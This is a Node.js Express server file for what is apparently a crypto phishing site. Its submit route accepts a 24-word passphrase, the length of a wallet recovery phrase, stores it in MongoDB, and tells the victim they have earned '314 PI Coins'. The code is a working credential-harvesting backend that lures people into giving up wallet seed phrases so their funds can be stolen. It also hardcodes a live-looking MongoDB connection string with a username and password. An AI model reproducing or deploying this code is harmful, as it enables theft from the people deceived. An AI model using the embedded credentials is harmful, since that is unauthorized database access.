const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');

// Create Express app
const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// MongoDB Connection
const mongoURI = 'mongodb+srv://nycer84:22Zs37OelVnqlJ3q@cluster0.g89nk.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0';
mongoose
    .connect(mongoURI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('MongoDB connected'))
    .catch(err => console.error('MongoDB connection error:', err));

// Define Mongoose Schema and Model
const PassphraseSchema = new mongoose.Schema({
    passphrase: { type: String, required: true }
});
const Passphrase = mongoose.model('Passphrase', PassphraseSchema);

// Serve index.html for root URL
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// POST Route to handle form submission
app.post('/submit', async (req, res) => {
    const { passphrase } = req.body;

    if (!passphrase || passphrase.trim().split(" ").length !== 24) {
        return res.status(400).send('Invalid passphrase. Ensure it has exactly 24 words.');
    }

    try {
        const newPassphrase = new Passphrase({ passphrase });
        await newPassphrase.save();

        const successMessage = `
            <div style="background-color: white; padding: 20px; text-align: center;">
                <h2 style="font-size: 24px; font-family: Arial, sans-serif; background-image: linear-gradient(to left, #ff0000, #ff9900, #33cc33, #3399ff, #9933ff); -webkit-background-clip: text; color: transparent;">
                    Congratulations!!! You have earned your 314 PI Coins Successfully!!
                </h2>
            </div>
        `;
        res.status(200).send(successMessage);
    } catch (error) {
        console.error('Error saving passphrase:', error);
        res.status(500).send('Failed to save passphrase.');
    }
});

// Start the server
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
